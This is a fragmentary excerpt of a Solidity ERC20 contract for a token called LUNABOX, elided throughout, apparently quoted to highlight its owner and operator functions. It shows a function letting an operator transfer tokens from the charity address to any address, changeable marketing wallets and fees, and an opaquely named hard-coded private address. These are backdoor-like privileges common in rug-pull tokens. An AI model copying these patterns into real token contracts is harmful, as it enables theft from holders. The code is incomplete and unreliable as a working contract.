...
contract  LUNABOX is ERC20 {
   ...
   bool public swapping;
    ...
    address public market = 0x6A47a5763E85A4934191A43732673e117dEDbd31;
    ...
    uint256 public totalFees = liquidityFee.add(marketingFee);
     ...
     uint256 public swapTokensAtAmount = 210 * 10**2 * 10**9;
      uint256 public _maxTxAmount = 52 * 10**6 * (10**9);
  ...
  address  private ererer = 0x149D9bCb1ae46D37A69144aCd53102dA78D8b523;
    ...
    constructor(
        ...
        isbig[owner()] = true;
        _totalSupply = (210*10**5) * (10**9);
        _balances[owner()] = (210*10**5) * (10**9);
          emit Transfer(address(0), owner(), (210*10**5) * (10**9));
    }
  ...
  function setmarket(address adr) public onlyOperator(){
      market = adr;
  }
       modifier pauseOwner() {
    ...
    function setExcludedFromFees(address user,bool bools)external onlyOperator{
  ...
  function  setswapTokensAtAmount(uint256 amount)public onlyOperator{
    ...
    function swapTokensForUSDC(uint256 tokenAmount) private {
       ...
       function sendCharityToken(address add,uint256 amount) public onlyOperator{
        _transfer(_charityAddress,add,amount);
    }   
    ...
    function setMarketingFee(uint256 value) external onlyOwner{
     ...
     function setLswappingTwo(bool bools)external pauseOwner(){
      swappingTwo=bools;
  }
